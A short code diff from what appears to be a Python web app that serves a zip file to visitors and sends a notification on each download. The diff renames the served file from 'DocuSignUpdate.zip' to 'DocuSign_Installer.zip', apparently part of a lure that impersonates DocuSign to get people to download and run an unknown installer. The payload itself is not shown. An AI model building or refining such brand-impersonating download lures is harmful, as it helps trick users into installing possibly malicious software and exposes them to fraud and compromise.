@@ -174,13 +174,13 @@ def download():
     send_notification(download_message)
     
     # Serve the zip file
-    zip_file_path = os.path.join(os.path.dirname(__file__), 'downloads', 'DocuSignUpdate.zip')
+    zip_file_path = os.path.join(os.path.dirname(__file__), 'downloads', 'DocuSign_Installer.zip')
     
     if os.path.exists(zip_file_path):
         return send_file(
             zip_file_path,
             as_attachment=True,
-            download_name='DocuSignUpdate.zip',
+            download_name='DocuSign_Installer.zip',
             mimetype='application/zip'
         )
     else:
